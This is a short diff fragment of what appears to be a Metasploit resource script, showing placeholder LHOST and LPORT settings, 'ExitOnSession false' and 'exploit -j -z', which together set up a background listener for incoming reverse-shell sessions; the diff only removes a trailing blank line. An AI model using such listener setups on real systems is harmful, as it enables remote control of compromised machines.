@@ -4,4 +4,3 @@ set LHOST bbb
 set LPORT ccc
 set ExitOnSession false
 exploit -j -z
-
